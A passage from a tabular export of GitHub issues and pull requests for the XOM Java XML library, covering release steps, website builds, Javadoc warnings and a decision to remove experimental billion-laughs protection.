3. ```$ ant dist ```
4. Commit and push.
5. Squash and merge
6. Tag on Github with release   
7. Upload binaries to IBiblio
8.  ```$ gcloud app deploy ./dist/website/WEB-INF/appengine-web.xml --project=xom-website --no-promote --version=TAG```
9. Set up snapshot for next release in build.xml. Commit and push. Squash and merge
10. Migrate site in cloud console",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/83/labels{/name},https://api.github.com/repos/elharo/xom/issues/83/comments,https://api.github.com/repos/elharo/xom/issues/83/events,https://github.com/elharo/xom/issues/83,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/82,345456566,MDExOlB1bGxSZXF1ZXN0MjA0NTk3NzIx,82,build website as part of dist,1005544,closed,FALSE,NA,NA,0,2018-07-28T15:25:19Z,2018-07-29T19:52:34Z,2018-07-29T19:52:31Z,OWNER,NA,fix #80,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/82/labels{/name},https://api.github.com/repos/elharo/xom/issues/82/comments,https://api.github.com/repos/elharo/xom/issues/82/events,https://github.com/elharo/xom/pull/82,https://api.github.com/repos/elharo/xom/pulls/82
elharo,xom,https://api.github.com/repos/elharo/xom/issues/81,345455668,MDU6SXNzdWUzNDU0NTU2Njg=,81,Delete maven1 target in build.xml,1005544,closed,FALSE,NA,NA,0,2018-07-28T15:13:02Z,2018-07-29T22:15:51Z,2018-07-29T22:15:51Z,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/81/labels{/name},https://api.github.com/repos/elharo/xom/issues/81/comments,https://api.github.com/repos/elharo/xom/issues/81/events,https://github.com/elharo/xom/issues/81,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/80,345454860,MDU6SXNzdWUzNDU0NTQ4NjA=,80,Bundle API docs with website,1005544,closed,FALSE,NA,NA,0,2018-07-28T15:01:27Z,2018-07-29T19:52:31Z,2018-07-29T19:52:31Z,OWNER,NA,ant dist does not automatically generate them and put them in the right place,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/80/labels{/name},https://api.github.com/repos/elharo/xom/issues/80/comments,https://api.github.com/repos/elharo/xom/issues/80/events,https://github.com/elharo/xom/issues/80,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/79,345453859,MDU6SXNzdWUzNDU0NTM4NTk=,79,Source code links can be served from github tag,1005544,open,FALSE,NA,NA,0,2018-07-28T14:47:16Z,2018-07-28T14:47:16Z,NA,OWNER,NA,E.g. https://github.com/elharo/xom/releases/tag/XOM_1211,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/79/labels{/name},https://api.github.com/repos/elharo/xom/issues/79/comments,https://api.github.com/repos/elharo/xom/issues/79/events,https://github.com/elharo/xom/issues/79,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/78,345451136,MDU6SXNzdWUzNDU0NTExMzY=,78,Test that index.html and other html files in website are valid XHTML,1005544,open,FALSE,NA,NA,0,2018-07-28T14:10:43Z,2018-07-28T14:10:43Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/78/labels{/name},https://api.github.com/repos/elharo/xom/issues/78/comments,https://api.github.com/repos/elharo/xom/issues/78/events,https://github.com/elharo/xom/issues/78,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/77,345451042,MDExOlB1bGxSZXF1ZXN0MjA0NTk0NjYz,77,update release notes,1005544,closed,FALSE,NA,NA,0,2018-07-28T14:09:16Z,2018-07-28T14:44:50Z,2018-07-28T14:44:46Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/77/labels{/name},https://api.github.com/repos/elharo/xom/issues/77/comments,https://api.github.com/repos/elharo/xom/issues/77/events,https://github.com/elharo/xom/pull/77,https://api.github.com/repos/elharo/xom/pulls/77
elharo,xom,https://api.github.com/repos/elharo/xom/issues/76,343448276,MDExOlB1bGxSZXF1ZXN0MjAzMDgyNTg5,76,40 minute timeout on tests,1005544,closed,FALSE,NA,NA,0,2018-07-22T23:18:34Z,2018-07-23T13:45:26Z,2018-07-23T13:45:23Z,OWNER,NA,fix #27,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/76/labels{/name},https://api.github.com/repos/elharo/xom/issues/76/comments,https://api.github.com/repos/elharo/xom/issues/76/events,https://github.com/elharo/xom/pull/76,https://api.github.com/repos/elharo/xom/pulls/76
elharo,xom,https://api.github.com/repos/elharo/xom/issues/75,343445583,MDExOlB1bGxSZXF1ZXN0MjAzMDgwOTc4,75,back out billion laughs protection,1005544,closed,FALSE,NA,NA,0,2018-07-22T22:39:39Z,2018-07-22T23:12:20Z,2018-07-22T23:12:16Z,OWNER,NA,fix #73,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/75/labels{/name},https://api.github.com/repos/elharo/xom/issues/75/comments,https://api.github.com/repos/elharo/xom/issues/75/events,https://github.com/elharo/xom/pull/75,https://api.github.com/repos/elharo/xom/pulls/75
elharo,xom,https://api.github.com/repos/elharo/xom/issues/74,343405558,MDU6SXNzdWUzNDM0MDU1NTg=,74,Add instructions for importing project into Eclipse,1005544,open,FALSE,NA,NA,0,2018-07-22T13:21:12Z,2018-07-22T13:21:12Z,NA,OWNER,NA,"1. Import Existing project (not ant project)
2. Configure Java versions
3. Configure warnings.",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/74/labels{/name},https://api.github.com/repos/elharo/xom/issues/74/comments,https://api.github.com/repos/elharo/xom/issues/74/events,https://github.com/elharo/xom/issues/74,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/73,343404542,MDU6SXNzdWUzNDM0MDQ1NDI=,73,Back out Billion Laughs protection,1005544,closed,FALSE,NA,NA,1,2018-07-22T13:04:27Z,2018-07-22T23:12:16Z,2018-07-22T23:12:16Z,OWNER,NA,"Before the release of 1.2.11 I'm thinking about backing out the experimental limits on document memory sizes; that is, billion laugh protection.

As best I can tell this doesn't truly work. It will catch some problems, but can be bypassed by a clever attacker. I'd rather not provide a false sense of security, and I think this can be better addressed at the parser level using techniques like XMLConstants.FEATURE_SECURE_PROCESSING

",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/73/labels{/name},https://api.github.com/repos/elharo/xom/issues/73/comments,https://api.github.com/repos/elharo/xom/issues/73/events,https://github.com/elharo/xom/issues/73,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/72,343402573,MDExOlB1bGxSZXF1ZXN0MjAzMDU1MDAz,72,switch to openjdk image,1005544,closed,FALSE,NA,NA,1,2018-07-22T12:34:04Z,2018-07-22T12:46:46Z,2018-07-22T12:46:41Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/72/labels{/name},https://api.github.com/repos/elharo/xom/issues/72/comments,https://api.github.com/repos/elharo/xom/issues/72/events,https://github.com/elharo/xom/pull/72,https://api.github.com/repos/elharo/xom/pulls/72
elharo,xom,https://api.github.com/repos/elharo/xom/issues/71,343335574,MDU6SXNzdWUzNDMzMzU1NzQ=,71,javadoc: warning - Multiple sources of package comments found for package,1005544,open,FALSE,NA,NA,0,2018-07-21T15:44:46Z,2018-07-21T15:44:46Z,NA,OWNER,NA,"  [javadoc] javadoc: warning - Multiple sources of package comments found for package ""nu.xom.tests""
  [javadoc] javadoc: warning - Multiple sources of package comments found for package ""nu.xom""
  [javadoc] javadoc: warning - Multiple sources of package comments found for package ""nu.xom.canonical""
  [javadoc] javadoc: warning - Multiple sources of package comments found for package ""nu.xom.converters""
  [javadoc] javadoc: warning - Multiple sources of package comments found for package ""nu.xom.xinclude""
  [javadoc] javadoc: warning - Multiple sources of package comments found for package ""nu.xom.xslt""",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/71/labels{/name},https://api.github.com/repos/elharo/xom/issues/71/comments,https://api.github.com/repos/elharo/xom/issues/71/events,https://github.com/elharo/xom/issues/71,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/70,343333421,MDExOlB1bGxSZXF1ZXN0MjAzMDEzODMz,70,update version number to 1.2.11,1005544,closed,FALSE,NA,NA,0,2018-07-21T15:13:41Z,2018-07-28T13:54:55Z,2018-07-28T13:54:53Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/70/labels{/name},https://api.github.com/repos/elharo/xom/issues/70/comments,https://api.github.com/repos/elharo/xom/issues/70/events,https://github.com/elharo/xom/pull/70,https://api.github.com/repos/elharo/xom/pulls/70
elharo,xom,https://api.github.com/repos/elharo/xom/issues/69,343333390,MDExOlB1bGxSZXF1ZXN0MjAzMDEzODE0,69,Covariant return types on copy() methods,124581,closed,FALSE,NA,NA,5,2018-07-21T15:13:06Z,2018-07-30T23:33:52Z,2018-07-30T01:30:40Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/69/labels{/name},https://api.github.com/repos/elharo/xom/issues/69/comments,https://api.github.com/repos/elharo/xom/issues/69/events,https://github.com/elharo/xom/pull/69,https://api.github.com/repos/elharo/xom/pulls/69
elharo,xom,https://api.github.com/repos/elharo/xom/issues/68,343333090,MDU6SXNzdWUzNDMzMzMwOTA=,68,Document release process in wiki,1005544,closed,FALSE,NA,NA,1,2018-07-21T15:08:34Z,2018-12-31T15:54:16Z,2018-12-31T15:54:16Z,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/68/labels{/name},https://api.github.com/repos/elharo/xom/issues/68/comments,https://api.github.com/repos/elharo/xom/issues/68/events,https://github.com/elharo/xom/issues/68,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/67,343332990,MDExOlB1bGxSZXF1ZXN0MjAzMDEzNTkx,67,update JavaDoc,1005544,closed,FALSE,NA,NA,0,2018-07-21T15:07:31Z,2018-07-21T15:07:45Z,2018-07-21T15:07:40Z,OWNER,NA,fix #61,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/67/labels{/name},https://api.github.com/repos/elharo/xom/issues/67/comments,https://api.github.com/repos/elharo/xom/issues/67/events,https://github.com/elharo/xom/pull/67,https://api.github.com/repos/elharo/xom/pulls/67
elharo,xom,https://api.github.com/repos/elharo/xom/issues/66,341352581,MDExOlB1bGxSZXF1ZXN0MjAxNTE1ODkx,66,exclusive C14n is supported,1005544,closed,FALSE,NA,NA,0,2018-07-15T21:09:31Z,2018-07-15T21:09:42Z,2018-07-15T21:09:39Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/66/labels{/name},https://api.github.com/repos/elharo/xom/issues/66/comments,https://api.github.com/repos/elharo/xom/issues/66/events,https://github.com/elharo/xom/pull/66,https://api.github.com/repos/elharo/xom/pulls/66
elharo,xom,https://api.github.com/repos/elharo/xom/issues/65,341351172,MDExOlB1bGxSZXF1ZXN0MjAxNTE0OTk0,65,add whatswrong,1005544,closed,FALSE,NA,NA,0,2018-07-15T20:48:34Z,2018-07-15T20:48:46Z,2018-07-15T20:48:43Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/65/labels{/name},https://api.github.com/repos/elharo/xom/issues/65/comments,https://api.github.com/repos/elharo/xom/issues/65/events,https://github.com/elharo/xom/pull/65,https://api.github.com/repos/elharo/xom/pulls/65
elharo,xom,https://api.github.com/repos/elharo/xom/issues/64,341346181,MDExOlB1bGxSZXF1ZXN0MjAxNTEyMjcz,64,clean should delete dist directory,1005544,closed,FALSE,NA,NA,0,2018-07-15T19:42:06Z,2018-07-15T19:42:23Z,2018-07-15T19:42:19Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/64/labels{/name},https://api.github.com/repos/elharo/xom/issues/64/comments,https://api.github.com/repos/elharo/xom/issues/64/events,https://github.com/elharo/xom/pull/64,https://api.github.com/repos/elharo/xom/pulls/64
elharo,xom,https://api.github.com/repos/elharo/xom/issues/63,341345533,MDExOlB1bGxSZXF1ZXN0MjAxNTExODkw,63,app engine deployment data,1005544,closed,FALSE,NA,NA,0,2018-07-15T19:32:58Z,2018-07-15T19:33:08Z,2018-07-15T19:33:04Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/63/labels{/name},https://api.github.com/repos/elharo/xom/issues/63/comments,https://api.github.com/repos/elharo/xom/issues/63/events,https://github.com/elharo/xom/pull/63,https://api.github.com/repos/elharo/xom/pulls/63
elharo,xom,https://api.github.com/repos/elharo/xom/issues/62,341342409,MDExOlB1bGxSZXF1ZXN0MjAxNTEwMTAy,62,move test reports to website,1005544,closed,FALSE,NA,NA,0,2018-07-15T18:46:43Z,2018-07-15T18:46:55Z,2018-07-15T18:46:51Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/62/labels{/name},https://api.github.com/repos/elharo/xom/issues/62/comments,https://api.github.com/repos/elharo/xom/issues/62/events,https://github.com/elharo/xom/pull/62,https://api.github.com/repos/elharo/xom/pulls/62
elharo,xom,https://api.github.com/repos/elharo/xom/issues/61,341340126,MDU6SXNzdWUzNDEzNDAxMjY=,61,Update XSLTransform javadoc,1005544,closed,FALSE,NA,NA,0,2018-07-15T18:11:36Z,2018-07-21T15:07:40Z,2018-07-21T15:07:40Z,OWNER,NA,to reflect more recent JDKs,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/61/labels{/name},https://api.github.com/repos/elharo/xom/issues/61/comments,https://api.github.com/repos/elharo/xom/issues/61/events,https://github.com/elharo/xom/issues/61,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/60,341333848,MDExOlB1bGxSZXF1ZXN0MjAxNTA1MTA1,60,Put website into main dist directory,1005544,closed,FALSE,NA,NA,0,2018-07-15T16:25:54Z,2018-07-15T17:49:33Z,2018-07-15T17:49:30Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/60/labels{/name},https://api.github.com/repos/elharo/xom/issues/60/comments,https://api.github.com/repos/elharo/xom/issues/60/events,https://github.com/elharo/xom/pull/60,https://api.github.com/repos/elharo/xom/pulls/60
elharo,xom,https://api.github.com/repos/elharo/xom/issues/59,341326931,MDU6SXNzdWUzNDEzMjY5MzE=,59,Make API Doc part of website build,1005544,open,FALSE,NA,NA,0,2018-07-15T14:55:16Z,2018-07-15T14:55:16Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/59/labels{/name},https://api.github.com/repos/elharo/xom/issues/59/comments,https://api.github.com/repos/elharo/xom/issues/59/events,https://github.com/elharo/xom/issues/59,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/58,341326887,MDU6SXNzdWUzNDEzMjY4ODc=,58,Commit App Engine config files to repo,1005544,closed,FALSE,NA,NA,0,2018-07-15T14:54:43Z,2018-07-21T15:09:12Z,2018-07-21T15:09:12Z,OWNER,NA,"web.xml, appengine-web.xml etc.",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/58/labels{/name},https://api.github.com/repos/elharo/xom/issues/58/comments,https://api.github.com/repos/elharo/xom/issues/58/events,https://github.com/elharo/xom/issues/58,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/57,341326690,MDExOlB1bGxSZXF1ZXN0MjAxNTAxNzEy,57,remove unstable docs and old build instructions,1005544,closed,FALSE,NA,NA,0,2018-07-15T14:51:49Z,2018-07-15T14:51:59Z,2018-07-15T14:51:55Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/57/labels{/name},https://api.github.com/repos/elharo/xom/issues/57/comments,https://api.github.com/repos/elharo/xom/issues/57/events,https://github.com/elharo/xom/pull/57,https://api.github.com/repos/elharo/xom/pulls/57
elharo,xom,https://api.github.com/repos/elharo/xom/issues/56,341322697,MDExOlB1bGxSZXF1ZXN0MjAxNDk5MzIw,56,use output directory,1005544,closed,FALSE,NA,NA,0,2018-07-15T13:51:36Z,2018-07-15T14:38:25Z,2018-07-15T14:38:22Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/56/labels{/name},https://api.github.com/repos/elharo/xom/issues/56/comments,https://api.github.com/repos/elharo/xom/issues/56/events,https://github.com/elharo/xom/pull/56,https://api.github.com/repos/elharo/xom/pulls/56
elharo,xom,https://api.github.com/repos/elharo/xom/issues/55,341322637,MDExOlB1bGxSZXF1ZXN0MjAxNDk5Mjcy,55,add tutorial.xsl,1005544,closed,FALSE,NA,NA,0,2018-07-15T13:50:50Z,2018-07-15T13:50:59Z,2018-07-15T13:50:57Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/55/labels{/name},https://api.github.com/repos/elharo/xom/issues/55/comments,https://api.github.com/repos/elharo/xom/issues/55/events,https://github.com/elharo/xom/pull/55,https://api.github.com/repos/elharo/xom/pulls/55
elharo,xom,https://api.github.com/repos/elharo/xom/issues/54,341321496,MDU6SXNzdWUzNDEzMjE0OTY=,54,Remove docs dependence on Saxon 6.5.5,1005544,open,FALSE,NA,NA,0,2018-07-15T13:34:21Z,2018-07-15T13:34:21Z,NA,OWNER,NA,I.e. use XOM to do the transforms,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/54/labels{/name},https://api.github.com/repos/elharo/xom/issues/54/comments,https://api.github.com/repos/elharo/xom/issues/54/events,https://github.com/elharo/xom/issues/54,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/53,341318709,MDExOlB1bGxSZXF1ZXN0MjAxNDk2Njk3,53,new DocBook URL + native validity checking,1005544,closed,FALSE,NA,NA,0,2018-07-15T12:51:19Z,2018-07-15T13:32:43Z,2018-07-15T13:32:39Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/53/labels{/name},https://api.github.com/repos/elharo/xom/issues/53/comments,https://api.github.com/repos/elharo/xom/issues/53/events,https://github.com/elharo/xom/pull/53,https://api.github.com/repos/elharo/xom/pulls/53
elharo,xom,https://api.github.com/repos/elharo/xom/issues/52,341315884,MDExOlB1bGxSZXF1ZXN0MjAxNDk0ODA1,52,Docsbuild,1005544,closed,FALSE,NA,NA,0,2018-07-15T12:04:14Z,2018-07-15T12:05:15Z,2018-07-15T12:05:11Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/52/labels{/name},https://api.github.com/repos/elharo/xom/issues/52/comments,https://api.github.com/repos/elharo/xom/issues/52/events,https://github.com/elharo/xom/pull/52,https://api.github.com/repos/elharo/xom/pulls/52
elharo,xom,https://api.github.com/repos/elharo/xom/issues/51,341275640,MDExOlB1bGxSZXF1ZXN0MjAxNDcxOTEx,51,add build.xml for docs,1005544,closed,FALSE,NA,NA,0,2018-07-14T22:33:51Z,2018-07-14T22:34:05Z,2018-07-14T22:34:00Z,OWNER,NA,Not sure why this file didn't come across from sourceforge,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/51/labels{/name},https://api.github.com/repos/elharo/xom/issues/51/comments,https://api.github.com/repos/elharo/xom/issues/51/events,https://github.com/elharo/xom/pull/51,https://api.github.com/repos/elharo/xom/pulls/51
elharo,xom,https://api.github.com/repos/elharo/xom/issues/50,341274217,MDExOlB1bGxSZXF1ZXN0MjAxNDcxMTk4,50,fix github link,1005544,closed,FALSE,NA,NA,0,2018-07-14T22:09:27Z,2018-07-14T22:09:40Z,2018-07-14T22:09:36Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/50/labels{/name},https://api.github.com/repos/elharo/xom/issues/50/comments,https://api.github.com/repos/elharo/xom/issues/50/events,https://github.com/elharo/xom/pull/50,https://api.github.com/repos/elharo/xom/pulls/50
elharo,xom,https://api.github.com/repos/elharo/xom/issues/49,341272272,MDExOlB1bGxSZXF1ZXN0MjAxNDcwNTg5,49,Upgrade Tagsoup to 1.2.1,1005544,closed,FALSE,NA,NA,0,2018-07-14T21:49:59Z,2018-07-14T21:50:13Z,2018-07-14T21:50:08Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/49/labels{/name},https://api.github.com/repos/elharo/xom/issues/49/comments,https://api.github.com/repos/elharo/xom/issues/49/events,https://github.com/elharo/xom/pull/49,https://api.github.com/repos/elharo/xom/pulls/49
elharo,xom,https://api.github.com/repos/elharo/xom/issues/48,341254339,MDExOlB1bGxSZXF1ZXN0MjAxNDYyMjky,48,update main website page,1005544,closed,FALSE,NA,NA,0,2018-07-14T17:57:07Z,2018-07-14T17:57:20Z,2018-07-14T17:57:15Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/48/labels{/name},https://api.github.com/repos/elharo/xom/issues/48/comments,https://api.github.com/repos/elharo/xom/issues/48/events,https://github.com/elharo/xom/pull/48,https://api.github.com/repos/elharo/xom/pulls/48
elharo,xom,https://api.github.com/repos/elharo/xom/issues/47,341238048,MDExOlB1bGxSZXF1ZXN0MjAxNDUyNzMx,47,ignore various files,1005544,closed,FALSE,NA,NA,0,2018-07-14T13:53:03Z,2018-07-14T13:53:32Z,2018-07-14T13:53:28Z,OWNER,NA,fix #36,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/47/labels{/name},https://api.github.com/repos/elharo/xom/issues/47/comments,https://api.github.com/repos/elharo/xom/issues/47/events,https://github.com/elharo/xom/pull/47,https://api.github.com/repos/elharo/xom/pulls/47
elharo,xom,https://api.github.com/repos/elharo/xom/issues/46,340570137,MDU6SXNzdWUzNDA1NzAxMzc=,46,Update web page,1005544,closed,FALSE,NA,NA,0,2018-07-12T09:59:37Z,2018-07-21T13:09:33Z,2018-07-21T13:09:33Z,OWNER,NA,Need to upload revised web page to xom.nu,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/46/labels{/name},https://api.github.com/repos/elharo/xom/issues/46/comments,https://api.github.com/repos/elharo/xom/issues/46/events,https://github.com/elharo/xom/issues/46,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/45,302029772,MDExOlB1bGxSZXF1ZXN0MTcyNjg1OTgx,45,website updates; mostly links,1005544,closed,FALSE,NA,NA,0,2018-03-03T20:30:55Z,2018-07-14T12:55:37Z,2018-03-03T20:31:01Z,OWNER,NA,fix #24 ,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/45/labels{/name},https://api.github.com/repos/elharo/xom/issues/45/comments,https://api.github.com/repos/elharo/xom/issues/45/events,https://github.com/elharo/xom/pull/45,https://api.github.com/repos/elharo/xom/pulls/45
elharo,xom,https://api.github.com/repos/elharo/xom/issues/44,302016923,MDExOlB1bGxSZXF1ZXN0MTcyNjc4Mjk1,44,update email,1005544,closed,FALSE,NA,NA,0,2018-03-03T17:37:40Z,2018-03-03T20:18:37Z,2018-03-03T20:18:32Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/44/labels{/name},https://api.github.com/repos/elharo/xom/issues/44/comments,https://api.github.com/repos/elharo/xom/issues/44/events,https://github.com/elharo/xom/pull/44,https://api.github.com/repos/elharo/xom/pulls/44
elharo,xom,https://api.github.com/repos/elharo/xom/issues/43,302016196,MDExOlB1bGxSZXF1ZXN0MTcyNjc3ODM0,43,circleci config,1005544,closed,FALSE,NA,NA,0,2018-03-03T17:27:36Z,2018-03-03T17:27:52Z,2018-03-03T17:27:48Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/43/labels{/name},https://api.github.com/repos/elharo/xom/issues/43/comments,https://api.github.com/repos/elharo/xom/issues/43/events,https://github.com/elharo/xom/pull/43,https://api.github.com/repos/elharo/xom/pulls/43
elharo,xom,https://api.github.com/repos/elharo/xom/issues/42,302013416,MDU6SXNzdWUzMDIwMTM0MTY=,42,Clarify minimum Java version,52934,closed,FALSE,NA,NA,2,2018-03-03T16:49:38Z,2020-01-26T12:41:46Z,2020-01-26T12:41:46Z,NONE,NA,"README says

> It requires Java 1.2 or later. 

But the Ant file uses Java 1.6 for compiling. Documentation should be updated to correctly define the minumum Java version.",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/42/labels{/name},https://api.github.com/repos/elharo/xom/issues/42/comments,https://api.github.com/repos/elharo/xom/issues/42/events,https://github.com/elharo/xom/issues/42,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/41,302012748,MDU6SXNzdWUzMDIwMTI3NDg=,41,Update email address across codebase,1005544,closed,FALSE,NA,NA,0,2018-03-03T16:40:32Z,2018-03-03T20:19:14Z,2018-03-03T20:19:14Z,OWNER,NA,metalab.unc.edu --> ibiblio.org,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/41/labels{/name},https://api.github.com/repos/elharo/xom/issues/41/comments,https://api.github.com/repos/elharo/xom/issues/41/events,https://github.com/elharo/xom/issues/41,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/40,302012689,MDExOlB1bGxSZXF1ZXN0MTcyNjc1NzIx,40,1.5 or later is now required,1005544,closed,FALSE,NA,NA,0,2018-03-03T16:39:44Z,2018-03-03T17:17:38Z,2018-03-03T17:17:34Z,OWNER,NA,fix #32 ,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/40/labels{/name},https://api.github.com/repos/elharo/xom/issues/40/comments,https://api.github.com/repos/elharo/xom/issues/40/events,https://github.com/elharo/xom/pull/40,https://api.github.com/repos/elharo/xom/pulls/40
elharo,xom,https://api.github.com/repos/elharo/xom/issues/39,302011782,MDExOlB1bGxSZXF1ZXN0MTcyNjc1MTgw,39,JavaSE-16 OSGI,1005544,closed,FALSE,NA,NA,0,2018-03-03T16:29:51Z,2018-03-03T16:30:13Z,2018-03-03T16:30:10Z,OWNER,NA,fix #34 ,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/39/labels{/name},https://api.github.com/repos/elharo/xom/issues/39/comments,https://api.github.com/repos/elharo/xom/issues/39/events,https://github.com/elharo/xom/pull/39,https://api.github.com/repos/elharo/xom/pulls/39
elharo,xom,https://api.github.com/repos/elharo/xom/issues/38,302010834,MDExOlB1bGxSZXF1ZXN0MTcyNjc0NTc2,38,Move conformance tests to separate package,1005544,closed,FALSE,NA,NA,0,2018-03-03T16:18:57Z,2018-03-03T16:19:24Z,2018-03-03T16:19:21Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/38/labels{/name},https://api.github.com/repos/elharo/xom/issues/38/comments,https://api.github.com/repos/elharo/xom/issues/38/events,https://github.com/elharo/xom/pull/38,https://api.github.com/repos/elharo/xom/pulls/38
elharo,xom,https://api.github.com/repos/elharo/xom/issues/37,302003857,MDU6SXNzdWUzMDIwMDM4NTc=,37,Clover integrations,1005544,open,FALSE,NA,NA,0,2018-03-03T14:51:53Z,2018-07-14T13:55:48Z,NA,OWNER,NA,Now that clover is open source make it a standard part of the build.,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/37/labels{/name},https://api.github.com/repos/elharo/xom/issues/37/comments,https://api.github.com/repos/elharo/xom/issues/37/events,https://github.com/elharo/xom/issues/37,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/36,302003706,MDU6SXNzdWUzMDIwMDM3MDY=,36,Merge excludes from build.xml and .gitignore,1005544,closed,FALSE,1005544,NA,0,2018-03-03T14:50:05Z,2018-07-14T13:53:27Z,2018-07-14T13:53:27Z,OWNER,NA,"```
    <property name=""excludes""       value="".clover, .DS_Store, **/.DS_Store, **/.AppleFileInfo, **/*.zip, **/.thumbnails/**, clover_html/**, clover/**, xom.gif, data/XInclude-Test-Suite/**, data/xmlconf/**, data/canonical/xmlconf/**, data/oasis*/**, **/testresults/**, **/pantry/**, **/workspace/**, **/junit*properties, **/.nautilus-metafile.xml, website/**, **/.project, **/.classpath, build/**, dist/**, .settings/**, lib2/**, xom.fb, jester*, trademark*""/>

```",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/36/labels{/name},https://api.github.com/repos/elharo/xom/issues/36/comments,https://api.github.com/repos/elharo/xom/issues/36/events,https://github.com/elharo/xom/issues/36,NA
